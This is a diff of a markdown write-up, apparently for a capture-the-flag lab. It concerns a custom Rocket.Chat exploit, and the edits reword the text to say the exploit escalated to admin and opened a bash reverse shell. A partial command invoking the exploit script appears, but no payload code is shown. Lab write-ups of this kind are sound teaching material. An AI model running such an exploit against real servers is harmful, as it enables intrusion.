@@ -196,8 +196,6 @@ rce(target,ip_address,port)
 
 At this stage i spent alot of time testing different lines of code, searched for many hours and did countless attempts to get the payload to work. I had to use a modified snipet of code for the payload part from someone else and i manage to get it to work. 
 
-To be honnest, if it wasn't for the information online i could still be working in this payload.
-
 Now we can test my custom rocket.chat exploit to see if we recieve a shell on our attacker machine:
 
 ```
@@ -206,7 +204,7 @@ python3 ./rocket_chat_exploit.py -u test@test.com -a admin@rocket.thm -t 'http:/
 
 ![image](https://user-images.githubusercontent.com/76821053/128165312-df1ba041-d709-4673-a02c-ed824590f6c8.png)
 
-Success the exploit worked:
+Success the exploit worked, it privesc to admin and executed a custom bash reverse shell:
 
 ![image](https://user-images.githubusercontent.com/76821053/128165342-18106b2a-cdc1-4031-9ccc-7c915e90067b.png)
 
